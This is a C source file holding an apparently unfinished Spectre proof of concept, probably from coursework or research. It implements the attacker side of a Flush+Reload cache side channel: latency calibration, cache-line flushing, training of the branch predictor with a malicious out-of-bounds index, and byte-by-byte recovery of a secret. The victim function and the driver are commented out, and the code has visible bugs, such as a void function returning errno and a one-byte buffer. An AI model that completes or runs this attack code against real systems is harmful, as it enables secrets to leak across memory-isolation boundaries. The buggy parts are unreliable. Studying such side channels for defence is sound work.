#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include "./lib/nospec.h"
#include <string.h>
#include <stdbool.h>
#include "./lib/inline_asm.h"
#include <assert.h>
#include <ctype.h>
#include <inttypes.h>
#include <sys/mman.h>
#include <x86intrin.h>
#include <errno.h>


// void victim_function(uint32_t index);

int main (void){
    // victim_function(index);
}

// uint32_t victim_function(uint32_t * arr, uint32_t index, uint32_t stride){
//     /*
//         This Spectre PoC relies on realloc failing due to not enough memory for reallocation
//         When this occurs, arr_size would double in size due to being speculatively executed
//         Yet, access to the public array would occur during the speculation window, resulting in an array out of bounds access.
//         This leaves this code vulnerable to a Spectre attack that utilizes a side channel attack to extract the private index of the data array
//     */
//     if(arr_size < index){
//         array_idx = realloc(arr_size*2);
//         arr_size *= 2;
//         //I would like to fill the array after it is resized with new indices that are randomly generated
//         //However, this may exceed the speculation window in which we can extract secrets so the resized array will just have to be filled with 0s
//         //This should be ok
//     }
    
//     uint32_t new_idx = array_idx_nospec(index, arr_size);
//     uint32_t secret_idx = array_idx[new_idx];

//     return arr[secret_idx * stride];
// }


#define REP 100 // Number of repetitions to de-noise the channel
#define TRAINING_EPOCH 16 // 15 in-bound accesses then 1 out-of-bound access
#define BUF_SIZE 1

#define PAGE_SIZE 4096
#define CACHE_LINE_SIZE 64
#define SYMBOL_CNT (1 << (sizeof(char) * 8))

inline size_t csel(size_t T, size_t F, bool pred) {
    size_t mask = -(size_t)(!!pred); // Need to collapse "pred" to 0/1
    return (T & mask) | (F & ~mask);
    // return F ^ ((T ^ F) & mask);  // This also works and should be a bit faster
}

void flush_lines(void *start, size_t stride, size_t N) {
    for (size_t c = 0; c < N; c++) {
        _mm_clflush(start + stride * c);
    }
}

void decode_flush_reload_state(char *c, uint64_t *hits, size_t cnt) {
    uint64_t most_hits = 0, scd_most_hits = 0;
    unsigned char raw_c = '\0', scd_raw_c = '\0';
    for (size_t i = 0; i < cnt && i < SYMBOL_CNT; i++) {
        if (most_hits < hits[i]) {
            scd_most_hits = most_hits;
            scd_raw_c = raw_c;

            most_hits = hits[i];
            raw_c = i;
        }
    }

    *c = isprint(raw_c) ? raw_c : '?';
    char scd_c = isprint(scd_raw_c) ? scd_raw_c : '?';
    printf("Best guess: '%c' (ASCII=%#4x, #hits=%3lu); "
           "2nd best guess: '%c' (ASCII=%#4x, #hits=%3lu)\n",
           *c, *c, most_hits, scd_c, scd_raw_c, scd_most_hits);
}

// ====== The evil attacker code ======


uint64_t calibrate_latency() {
    uint64_t hit = 0, miss = 0, threshold, rep = 1000;
    uint8_t *data = malloc(8);
    assert(data); // Lazy "exception" handling

    // Measure cache hit latency
    _maccess(data);
    for (uint32_t n = 0; n < rep; n++) {
        uint64_t start = _timer_start();
        _maccess(data);
        hit += _timer_end() - start;
    }
    hit /= rep;

    // Measure cache miss latency
    for (uint32_t n = 0; n < rep; n++) {
        _mm_clflush(data);
        uint64_t start = _timer_start();
        _maccess(data);
        miss += _timer_end() - start;
    }
    miss /= rep;

    threshold = ((2 * miss) + hit) / 3;
    printf("Avg. hit latency: %" PRIu64 ", Avg. miss latency: %" PRIu64
           ", Threshold: %" PRIu64 "\n",
           hit, miss, threshold);
    free(data);
    return threshold;
}


void attacker_function(uint8_t *array, uint8_t *secret) {
    // Create read-only shared pages for Flush+Reload
    // SYMBOL_CNT=256
    uint8_t *pages = mmap(NULL, PAGE_SIZE * SYMBOL_CNT, PROT_READ,
                          MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (pages == MAP_FAILED) {
        perror("mmap");
        return errno;
    }


    uint64_t threshold = calibrate_latency();
    printf("-----------------------------------------\n");
    uint64_t hits[SYMBOL_CNT] = { 0 };
    char buf[BUF_SIZE] = { '\0' };

    // uint8_t *array_base = &records->orders[0].item_id; // Base address 
    uint8_t* array_base = &array[0]; // Base address
    size_t malicious_index = (uintptr_t)secret - (uintptr_t)array_base;
    printf("Secret address: %p, Array address: %p\n", secret, array_base);
    printf("The malicious index is %p-%p=%#lx\n", secret, array_base,
           malicious_index);
    printf("-----------------------------------------\n");

    for (size_t c = 0; c < strlen(secret) && c < BUF_SIZE - 1; c++) {

        for (size_t r = 0; r < REP; r++) {
            for (size_t t = 0; t < TRAINING_EPOCH; t++) {
                // We use an in-bound index for the first TRAINING_EPOCH - 1
                // iterations and switch to the malicious index
                // for the last iteration
                bool is_attack = (t % TRAINING_EPOCH == TRAINING_EPOCH - 1);
                size_t index = csel(malicious_index, 0, is_attack);

                // The "Flush" part of Flush+Reload
                // Can be replaced with Prime+Probe
                // startIndex, stride, N
                flush_lines(pages, PAGE_SIZE, SYMBOL_CNT);

                // Flush num_orders and num_items to delay branch resolution
                // Can be replaced with eviction using an eviction set
                // _mm_clflush(&records->num_orders);
                // _mm_clflush(&records->num_items);

                // Ensure clflushes are finished
                _mm_mfence();
                _mm_lfence();

                // Call the victim function and prevent compiler optimizations
                // TODO: change to correct victim function parameters
                // _no_opt(victim_function(records, index));
            }

            for (size_t i = 0; i < SYMBOL_CNT; i++) {
                // A clever hack to traverse [0, 255] in an unpredictable order
                // to confuse the prefetcher
                size_t idx = (i * 167 + 13) % SYMBOL_CNT;

                // The "Reload" part of Flush+Reload
                // Can be replaced with Prime+Probe
                uint8_t *ptr = pages + PAGE_SIZE * idx;
                hits[idx] += (_time_maccess(ptr) <= threshold);
            }
        }

        // Save the recovered character
        decode_flush_reload_state(&buf[c], hits, SYMBOL_CNT);
        memset(hits, 0, sizeof(hits)); // Reset hit counts
    }
    printf("Recovered secret: \"%s\"\n", buf);
    return;
}

// int main(int argc, char **argv) {
//     if (argc == 2 && strcmp(argv[1], "naive") == 0) {
//         printf("Using a naive Spectre PoC\n");
//     } else {
//     }
//     return 0;
// }
